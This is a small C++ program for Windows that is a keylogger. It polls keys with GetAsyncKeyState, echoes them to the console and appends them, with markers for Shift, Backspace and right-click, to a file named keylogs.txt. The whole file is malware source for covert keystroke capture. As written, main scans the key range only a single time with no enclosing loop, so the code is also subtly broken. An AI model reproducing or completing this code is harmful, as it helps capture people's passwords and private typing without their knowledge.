#include <fstream>
#include <Windows.h>
#include <string>
#include <cstdio>
#include <iostream>

using namespace std;

void WriteToLog(LPCSTR text)
{
	ofstream logfile; //creates object for file stream
	logfile.open("keylogs.txt", fstream::app);
	logfile << text; //writes text string to logfile
	logfile.close();
}

bool KeyIsListed(int iKey)
{
	switch (iKey)
	{
	case VK_SPACE:
		cout << " ";
		WriteToLog(" ");
		break;
	case VK_RETURN:
		cout << "\n";
		WriteToLog("\n");
		break;

	case VK_SHIFT:
		cout << " *Shift* ";
		WriteToLog(" *Shift* ");
		break;
	case VK_BACK:
		cout << "\b";
		WriteToLog("\b");
		break;
	case VK_RBUTTON:
		cout << " *rclick* ";
		WriteToLog(" *rclick* ");
		break;
	default: 
		return false;
	}
	return true;
}

int main(int argc, char* argv[])
{
	char key;
	Sleep(10);
	for (key = 8; key <= 190; key++) {
		if (GetAsyncKeyState(key) == -32767) {
			if (KeyIsListed(key) == FALSE) {
				cout << key;
				ofstream logfile("keylogs.txt", ios::app);
				logfile << key;
				logfile.close();
			}
		}
	}
	system("pause");
	return 0;
}